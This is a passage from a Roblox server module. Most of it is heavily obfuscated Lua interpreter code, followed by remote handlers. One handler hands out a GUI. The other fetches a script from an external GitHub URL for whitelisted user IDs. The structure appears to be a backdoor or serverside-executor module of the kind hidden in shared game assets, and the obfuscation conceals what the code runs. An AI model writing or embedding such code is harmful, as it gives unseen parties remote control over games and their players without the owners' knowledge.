end end end else if 30>f then if f>27 then if 27<=f then repeat if f~=29 then local a,_,k,b,u;for f=0,6 do if 3>f then if 1>f then a=e[d];_=r[e[t]];r[a+1]=_;r[a]=_[e[o]];n=n+1;e=l[n];else if 1==f then r(e[d],e[t]);n=n+1;e=l[n];else r[e[d]]=(e[t]~=0);n=n+1;e=l[n];end end else if 5>f then if f~=0 then for o=37,84 do if f<4 then a=e[d]k,b=c(r[a](h(r,a+1,e[t])))s=b+a-1 u=0;for e=a,s do u=u+1;r[e]=k[u];end;n=n+1;e=l[n];break;end;a=e[d]r[a]=r[a](h(r,a+1,s))n=n+1;e=l[n];break;end;else a=e[d]r[a]=r[a](h(r,a+1,s))n=n+1;e=l[n];end else if f>=1 then for h=41,55 do if 6>f then a=e[d]r[a]=r[a]()n=n+1;e=l[n];break;end;a=e[d];_=r[e[t]];r[a+1]=_;r[a]=_[e[o]];break;end;else a=e[d]r[a]=r[a]()n=n+1;e=l[n];end end end end break;end;for f=0,6 do if f>2 then if 4<f then if f>5 then r[e[d]]=a[e[t]];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else if f>3 then r[e[d]]=a[e[t]];n=n+1;e=l[n];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end else if 1<=f then if 1~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end until true;else local a,_,k,b,u;for f=0,6 do if 3>f then if 1>f then a=e[d];_=r[e[t]];r[a+1]=_;r[a]=_[e[o]];n=n+1;e=l[n];else if 1==f then r(e[d],e[t]);n=n+1;e=l[n];else r[e[d]]=(e[t]~=0);n=n+1;e=l[n];end end else if 5>f then if f~=0 then for o=37,84 do if f<4 then a=e[d]k,b=c(r[a](h(r,a+1,e[t])))s=b+a-1 u=0;for e=a,s do u=u+1;r[e]=k[u];end;n=n+1;e=l[n];break;end;a=e[d]r[a]=r[a](h(r,a+1,s))n=n+1;e=l[n];break;end;else a=e[d]r[a]=r[a](h(r,a+1,s))n=n+1;e=l[n];end else if f>=1 then for h=41,55 do if 6>f then a=e[d]r[a]=r[a]()n=n+1;e=l[n];break;end;a=e[d];_=r[e[t]];r[a+1]=_;r[a]=_[e[o]];break;end;else a=e[d]r[a]=r[a]()n=n+1;e=l[n];end end end end end else r[e[d]]=(e[t]~=0);end else if f<32 then if 26~=f then repeat if f~=31 then r[e[d]]=a[e[t]];break;end;local _,h;for f=0,6 do if 2<f then if f>4 then if 3<=f then for o=43,54 do if 5<f then r[e[d]]=a[e[t]];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];end else if f>=-1 then for o=31,75 do if f~=3 then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end else if 1>f then _=e[d];h=r[e[t]];r[_+1]=h;r[_]=h[e[o]];n=n+1;e=l[n];else if 2==f then r[e[d]]=a[e[t]];n=n+1;e=l[n];else r[e[d]]=r[e[t]];n=n+1;e=l[n];end end end end until true;else r[e[d]]=a[e[t]];end else if f~=31 then repeat if 33>f then n=e[t];break;end;local l,f,h,a,o;local n=0;while n>-1 do if n<=2 then if 0>=n then l=e;else if n>=-3 then for e=10,92 do if n<2 then f=d;break;end;h=t;break;end;else f=d;end end else if 5<=n then if n~=1 then for e=41,83 do if 5<n then n=-2;break;end;r(o,a);break;end;else r(o,a);end else if 3==n then a=l[h];else o=l[f];end end end n=n+1 end until true;else n=e[t];end end end end else if f<=47 then if 43<f then if f>=46 then if f>42 then for o=47,70 do if f~=47 then local o;for f=0,4 do if f>=2 then if 2>=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];else if f~=4 then o=e[d]r[o](h(r,o+1,e[t]))n=n+1;e=l[n];else n=e[t];end end else if f==0 then r[e[d]]=a[e[t]];n=n+1;e=l[n];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end break;end;local n=e[d]r[n](h(r,n+1,e[t]))break;end;else local o;for f=0,4 do if f>=2 then if 2>=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];else if f~=4 then o=e[d]r[o](h(r,o+1,e[t]))n=n+1;e=l[n];else n=e[t];end end else if f==0 then r[e[d]]=a[e[t]];n=n+1;e=l[n];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end end else if f<45 then r[e[d]]=a[e[t]];else local n=e[d];local d=r[e[t]];r[n+1]=d;r[n]=d[e[o]];end end else if f<=41 then local a,f;for _=0,4 do if 2>_ then if-1<_ then for h=43,96 do if _<1 then a=e[d];f=r[e[t]];r[a+1]=f;r[a]=f[e[o]];n=n+1;e=l[n];break;end;r(e[d],e[t]);n=n+1;e=l[n];break;end;else r(e[d],e[t]);n=n+1;e=l[n];end else if _<3 then a=e[d]r[a]=r[a](h(r,a+1,e[t]))n=n+1;e=l[n];else if _~=-1 then for h=10,82 do if 3<_ then a=e[d]r[a](r[a+1])break;end;a=e[d];f=r[e[t]];r[a+1]=f;r[a]=f[e[o]];n=n+1;e=l[n];break;end;else a=e[d];f=r[e[t]];r[a+1]=f;r[a]=f[e[o]];n=n+1;e=l[n];end end end end else if f>41 then repeat if 42<f then r[e[d]]=(e[t]~=0);break;end;if not r[e[d]]then n=n+1;else n=e[t];end;until true;else if not r[e[d]]then n=n+1;else n=e[t];end;end end end else if f<51 then if 48>=f then local f,c,s,u,k,b,_,a;for a=0,5 do if a>=3 then if 4<=a then if 3<a then for o=12,85 do if 4<a then if r[e[d]]then n=n+1;else n=e[t];end;break;end;f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];break;end;else if r[e[d]]then n=n+1;else n=e[t];end;end else a=0;while a>-1 do if a>=3 then if 4<a then if a~=3 then for e=17,77 do if a>5 then a=-2;break;end;r(_,b);break;end;else r(_,b);end else if a>-1 then for e=18,53 do if 4>a then b=s[k];break;end;_=s[u];break;end;else _=s[u];end end else if a>=1 then if a<2 then u=d;else k=t;end else s=e;end end a=a+1 end n=n+1;e=l[n];end else if a>0 then if a>=0 then repeat if 1<a then f=e[d];c=r[e[t]];r[f+1]=c;r[f]=c[e[o]];n=n+1;e=l[n];break;end;f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];until true;else f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];end else r(e[d],e[t]);n=n+1;e=l[n];end end end else if f>=46 then for a=15,74 do if 50>f then r[e[d]][e[t]]=r[e[o]];n=n+1;e=l[n];do return end;break;end;local e=e[d]r[e]=r[e]()break;end;else local e=e[d]r[e]=r[e]()end end else if 53<=f then if f~=52 then for a=42,52 do if f~=54 then local e=e[d]r[e](r[e+1])break;end;local a,f;a=e[d];f=r[e[t]];r[a+1]=f;r[a]=f[e[o]];n=n+1;e=l[n];r(e[d],e[t]);n=n+1;e=l[n];a=e[d]r[a]=r[a](h(r,a+1,e[t]))n=n+1;e=l[n];a=e[d];f=r[e[t]];r[a+1]=f;r[a]=f[e[o]];n=n+1;e=l[n];r(e[d],e[t]);n=n+1;e=l[n];a=e[d]r[a]=r[a](h(r,a+1,e[t]))n=n+1;e=l[n];if r[e[d]]then n=n+1;else n=e[t];end;break;end;else local e=e[d]r[e](r[e+1])end else if 49<=f then repeat if f>51 then if not r[e[d]]then n=n+1;else n=e[t];end;break;end;for f=0,6 do if f>=3 then if f>4 then if 5<f then r[e[d]]=a[e[t]];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else if f>-1 then repeat if 3~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end else if 1<=f then if-3<f then repeat if 1~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end until true;else for f=0,6 do if f>=3 then if f>4 then if 5<f then r[e[d]]=a[e[t]];else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else if f>-1 then repeat if 3~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end else if 1<=f then if-3<f then repeat if 1~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end end end end end end else if f>=13 then if 19<f then if f>22 then if 24>=f then if f>21 then repeat if f>23 then a[e[t]]=r[e[d]];break;end;local n=e[d]r[n]=r[n](h(r,n+1,e[t]))until true;else a[e[t]]=r[e[d]];end else if f==26 then local _,s,u,b,k,p,z,c,f;_=e[d];s=r[e[t]];r[_+1]=s;r[_]=s[e[o]];n=n+1;e=l[n];f=0;while f>-1 do if 3<f then if f<=5 then if 1<=f then repeat if 5>f then z=p[u[k]];break;end;c=u[b];until true;else c=u[b];end else if f~=5 then repeat if f<7 then r[c]=z;break;end;f=-2;until true;else r[c]=z;end end else if 1<f then if f>=1 then repeat if f>2 then p=r;break;end;k=t;until true;else k=t;end else if f>0 then b=d;else u=e;end end end f=f+1 end n=n+1;e=l[n];_=e[d]r[_]=r[_](h(r,_+1,e[t]))n=n+1;e=l[n];r[e[d]]=a[e[t]];n=n+1;e=l[n];r[e[d]]=a[e[t]];n=n+1;e=l[n];_=e[d];s=r[e[t]];r[_+1]=s;r[_]=s[e[o]];n=n+1;e=l[n];r(e[d],e[t]);else local e=e[d]r[e]=r[e]()end end else if 21>f then local e=e[d]r[e](r[e+1])else if f~=20 then for l=27,62 do if f>21 then if r[e[d]]then n=n+1;else n=e[t];end;break;end;r[e[d]]=p(m[e[t]],nil,a);break;end;else if r[e[d]]then n=n+1;else n=e[t];end;end end end else if f<=15 then if f<14 then local n=e[d]r[n]=r[n](h(r,n+1,e[t]))else if 14~=f then r(e[d],e[t]);else local _,u,c,s,z,k,b,f;_=e[d]r[_](h(r,_+1,e[t]))n=n+1;e=l[n];r[e[d]]=a[e[t]];n=n+1;e=l[n];_=e[d];u=r[e[t]];r[_+1]=u;r[_]=u[e[o]];n=n+1;e=l[n];f=0;while f>-1 do if f>2 then if f>4 then if f~=4 then for e=17,86 do if 6~=f then r(b,k);break;end;f=-2;break;end;else r(b,k);end else if-1~=f then for e=12,79 do if f~=3 then b=c[s];break;end;k=c[z];break;end;else b=c[s];end end else if f>0 then if-2<=f then for e=13,61 do if 2>f then s=d;break;end;z=t;break;end;else s=d;end else c=e;end end f=f+1 end n=n+1;e=l[n];_=e[d]r[_]=r[_](h(r,_+1,e[t]))n=n+1;e=l[n];_=e[d];u=r[e[t]];r[_+1]=u;r[_]=u[e[o]];n=n+1;e=l[n];f=0;while f>-1 do if f>=3 then if f>=5 then if 4<f then repeat if 6>f then r(b,k);break;end;f=-2;until true;else f=-2;end else if f~=3 then b=c[s];else k=c[z];end end else if f<=0 then c=e;else if f~=-1 then for e=15,79 do if f~=1 then z=t;break;end;s=d;break;end;else s=d;end end end f=f+1 end end end else if 18<=f then if f<19 then if(r[e[d]]~=e[o])then n=n+1;else n=e[t];end;else do return end;end else if f==16 then local f;r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];r[e[d]]=a[e[t]];n=n+1;e=l[n];r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];r[e[d]]=r[e[t]][e[o]];n=n+1;e=l[n];f=e[d]r[f]=r[f](h(r,f+1,e[t]))n=n+1;e=l[n];if r[e[d]]then n=n+1;else n=e[t];end;else n=e[t];end end end end else if f>5 then if f>=9 then if f<11 then if f==9 then r[e[d]]=r[e[t]];else for f=0,3 do if f<2 then if f>-2 then for o=36,75 do if 0~=f then a[e[t]]=r[e[d]];n=n+1;e=l[n];break;end;r[e[d]]=(e[t]~=0);n=n+1;e=l[n];break;end;else r[e[d]]=(e[t]~=0);n=n+1;e=l[n];end else if 3>f then r[e[d]]=a[e[t]];n=n+1;e=l[n];else if(r[e[d]]~=e[o])then n=n+1;else n=e[t];end;end end end end else if 7~=f then for h=23,55 do if f~=12 then r[e[d]]=r[e[t]][e[o]];break;end;for f=0,6 do if f<=2 then if 1<=f then if f>-3 then for o=30,95 do if 1~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else if f>=5 then if f~=2 then repeat if f~=5 then r[e[d]]=a[e[t]];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];end else if f~=-1 then for o=43,87 do if 4>f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end end break;end;else for f=0,6 do if f<=2 then if 1<=f then if f>-3 then for o=30,95 do if 1~=f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else r[e[d]]=a[e[t]];n=n+1;e=l[n];end else if f>=5 then if f~=2 then repeat if f~=5 then r[e[d]]=a[e[t]];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];until true;else r[e[d]]=a[e[t]];end else if f~=-1 then for o=43,87 do if 4>f then r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;r[e[d]]=a[e[t]];n=n+1;e=l[n];break;end;else r[e[d]]=a[e[t]];n=n+1;e=l[n];end end end end end end else if f>=7 then if 6~=f then for n=14,61 do if f<8 then local e=e[d]r[e]=r[e](h(r,e+1,s))break;end;r[e[d]][e[t]]=r[e[o]];break;end;else r[e[d]][e[t]]=r[e[o]];end else a[e[t]]=r[e[d]];end end else if 3<=f then if f<=3 then r[e[d]]=r[e[t]][e[o]];else if f>=0 then for n=25,87 do if 5~=f then local e=e[d]r[e]=r[e](h(r,e+1,s))break;end;r[e[d]][e[t]]=r[e[o]];break;end;else local e=e[d]r[e]=r[e](h(r,e+1,s))end end else if f<1 then local n=e[d]r[n](h(r,n+1,e[t]))else if f>=-1 then repeat if f<2 then r[e[d]]=p(m[e[t]],nil,a);break;end;do return end;until true;else do return end;end end end end end end n=1+n;end;end;return ee end;local d=0xff;local o={};local l=(1);local t='';(function(n)local r=n local a=0x00 local e=0x00 r={(function(f)if a>0x22 then return f end a=a+1 e=(e+0xca2-f)%0x2f return(e%0x03==0x1 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x9);t={t..'\58 a',t};o[l]=y();l=l+(1);t[1]='\58'..t[1];d[2]=0xff;end return true end)'bYSZy'and r[0x2](0x9f+f))or(e%0x03==0x0 and(function(r)if not n[r]then e=e+0x01 n[r]=(0xa3);o[l]=re();l=l+d;end return true end)'JDmuU'and r[0x3](f+0x28b))or(e%0x03==0x2 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x6c);t='\37';d={function()d()end};t=t..'\100\43';end return true end)'Rkqjr'and r[0x1](f+0x3e4))or f end),(function(f)if a>0x2d then return f end a=a+1 e=(e+0xdf2-f)%0x22 return(e%0x03==0x0 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x67);d[2]=(d[2]*(g(function()o()end,h(t))-g(d[1],h(t))))+1;o[l]={};d=d[2];l=l+d;end return true end)'AzRmq'and r[0x1](0x312+f))or(e%0x03==0x2 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x3a);end return true end)'XwCLB'and r[0x2](f+0x1b0))or(e%0x03==0x1 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x1f);end return true end)'sLOJr'and r[0x3](f+0x22e))or f end),(function(d)if a>0x2a then return d end a=a+1 e=(e+0xaf7-d)%0x25 return(e%0x03==0x2 and(function(r)if not n[r]then e=e+0x01 n[r]=(0xc);end return true end)'UPepo'and r[0x1](0xa9+d))or(e%0x03==0x1 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x26);end return true end)'Dxwmw'and r[0x3](d+0x30f))or(e%0x03==0x0 and(function(r)if not n[r]then e=e+0x01 n[r]=(0x90);end return true end)'nIZMq'and r[0x2](d+0x22f))or d end)}r[0x1](0x260d)end){};local e=p(h(o));return e(...);end return y((function()local n={}local e=0x01;local r;if _.kTPgqDsR then r=_.kTPgqDsR(y)else r=''end if _.ZmQ_liSn(r,_.xHkDaIti)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(r,e,n,d,t,l)local l;if r<=3 then if r<2 then if-3<=r then repeat if 1>r then do return e(1),e(4,t,d,n,e),e(5,t,d,n)end;break;end;do return function(n,e,r)if r then local e=(n/2^(e-1))%2^((r-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;until true;else do return e(1),e(4,t,d,n,e),e(5,t,d,n)end;end else if r>2 then do return e(1),e(4,t,d,n,e),e(5,t,d,n)end;else do return 16777216,65536,256 end;end end else if r<6 then if r~=2 then for l=23,55 do if r>4 then local r=d;do return function()local e=e(n,r(r,r),r(r,r));r(1);return e;end;end;break;end;local r=d;local l,t,f=t(2);do return function()local a,n,d,e=e(n,r(r,r),r(r,r)+3);r(4);return(e*l)+(d*t)+(n*f)+a;end;end;break;end;else local r=d;local l,t,d=t(2);do return function()local e,n,f,a=e(n,r(r,r),r(r,r)+3);r(4);return(a*l)+(f*t)+(n*d)+e;end;end;end else if 7<=r then if 5<=r then repeat if 7<r then do return n(r,nil,n);end break;end;do return setmetatable({},{['__\99\97\108\108']=function(e,t,d,r,n)if n then return e[n]elseif r then return e else e[t]=d end end})end until true;else do return n(r,nil,n);end end else do return t[n]end;end end end end),...) end

game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(player)
    module:givegui(player)
end)

game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
	if table.find(module.whitelist, plr.UserId) then
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua", true)
	end
end

return module
